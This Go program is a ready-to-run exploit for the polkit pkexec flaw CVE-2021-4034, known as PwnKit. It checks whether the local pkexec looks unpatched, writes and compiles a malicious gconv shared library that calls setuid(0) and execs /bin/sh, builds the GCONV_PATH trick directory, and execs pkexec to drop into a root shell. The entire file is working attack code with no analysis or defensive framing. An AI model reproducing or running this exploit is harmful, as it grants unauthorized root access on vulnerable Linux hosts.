package main

import (
    "fmt"
    "os"
    "os/exec"
    "bytes"
    "syscall"
    "strings"
    "strconv"
)

func longer_cmd(command string) string {
    tmpfile := "/tmp/testingfile"
    file, _ := os.Create(tmpfile)
    os.Chmod(tmpfile, 0777)
    _, _ = file.Write([]byte(fmt.Sprintf(command)))
    defer file.Close()

    whoami := exec.Command("/bin/bash", tmpfile)
    whoami_out := &bytes.Buffer{}
    whoami.Stdout = whoami_out
    whoami.Run()
    os.Remove(tmpfile)
    return fmt.Sprintf("%s", whoami_out)
}

func spawn_shell(command string) {
    tmpfile := "/tmp/testingfile"
    file, _ := os.Create(tmpfile)
    os.Chmod(tmpfile, 0777)
    _, _ = file.Write([]byte(fmt.Sprintf(command)))
    defer file.Close()

    args := []string{"/bin/bash", tmpfile}
    env := os.Environ()
    execErr := syscall.Exec("/bin/bash", args ,env)
    if execErr != nil {
        panic(execErr)
    }
}

func polkit_ver_test() bool {
    test := longer_cmd(fmt.Sprintf("%s", `stat -c '%%Y' $(which pkexec)`))
    test = strings.Replace(test, "\n", "", -1)
    test2, _ := strconv.Atoi(test)
    if test2 < 1642035600 {
        return true
    }
    return false
}

func pwnkit_exploit() {

    pwnkit_file_contents := fmt.Sprintf(`
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {
}

void gconv_init(void *step)
{
    char * const args[] = { "/bin/sh", NULL };
    char * const environ[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin", NULL };
    setuid(0);
    setgid(0);
    execve(args[0], args, environ);
    exit(0);
}
`)

    cve_2021_4034_file_contents := fmt.Sprintf(`
#include <unistd.h>

int main(int argc, char **argv)
{
    char * const args[] = {
        NULL
    };
    char * const environ[] = {
        "pwnkit.so:.",
        "PATH=GCONV_PATH=.",
        "SHELL=/lol/i/do/not/exists",
        "CHARSET=PWNKIT",
        "GIO_USE_VFS=",
        NULL
    };
    return execve("/usr/bin/pkexec", args, environ);
}
`)

    //create and write to files
    pwnkit , err := os.Create("pwnkit.c")
    if err != nil {
        fmt.Println("exploit file could not be created")
    }
    defer pwnkit.Close()
    pwnkit.WriteString(pwnkit_file_contents)

    cve_2021_4034, err := os.Create("cve-2021-4034.c")
    if err != nil {
        fmt.Println("exploit file could not be created")
    }
    defer cve_2021_4034.Close()
    cve_2021_4034.WriteString(cve_2021_4034_file_contents)

    // build and run files
    longer_cmd(`gcc -Wall --shared -fPIC -o pwnkit.so pwnkit.c`)
    longer_cmd(`gcc -Wall    cve-2021-4034.c   -o cve-2021-4034`)
    longer_cmd(`echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules`)
    longer_cmd(`mkdir -p GCONV_PATH=.`)
    longer_cmd(`cp -f /bin/true GCONV_PATH=./pwnkit.so:.`)
    fmt.Println("Notice: manual clean up required")
    spawn_shell(fmt.Sprintf(`./cve-2021-4034`))
}

func main() {
    commands := []string{"gcc", "echo", "mkdir", "cp"}

    fmt.Println("[+] Testing to see if machine is vulnerable")

    if polkit_ver_test() == false {
        fmt.Println("[-] This machine is not vulnerable to pwnkit")
        fmt.Println("[-] Exiting")

    } else if polkit_ver_test() == true {
        fmt.Println("[+] This machine is vulnerable to pwnkit")
        fmt.Println("[+] checking for required commands")

        for _, command := range commands {
            exists := longer_cmd(fmt.Sprintf("which"+" "+command))
            if exists == "" {
                fmt.Println(fmt.Sprintf("[-] requred command"+" "+command+" "+"does not exist on this system"))
                os.Exit(1)
                
            } else {
                fmt.Println(fmt.Sprintf("[+] "+command+" exists"))
            }
        }
        fmt.Println(`[+] attempting exploit`)
        pwnkit_exploit()
    }
}